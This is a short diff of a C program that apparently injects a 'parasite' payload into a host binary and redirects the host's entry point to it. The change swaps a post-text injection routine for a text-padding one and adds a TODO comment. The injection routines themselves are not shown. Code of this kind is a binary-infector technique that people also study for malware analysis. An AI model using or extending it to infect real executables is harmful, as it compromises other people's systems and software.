@@ -18,6 +18,8 @@ int main(int argc, char *argv[])
         exit(1);
     }
 
+    /* TODO Integrity check host for section header table */
+
     load_host(argv[1], &host);
 
     if ((parasite = malloc(strlen(argv[2]))) == NULL)
@@ -28,7 +30,8 @@ int main(int argc, char *argv[])
 
     strncpy(parasite, argv[2], strlen(argv[2]));
 
-    entry = posttext_inject(&host, parasite, patch_position);
+    /* PATCH TO (ENTRY [NULL], X) */
+    entry = textpadding_inject(&host, parasite, patch_position);
     reload_host(argv[1], &host);
 
     entry_redirect(&host, entry);
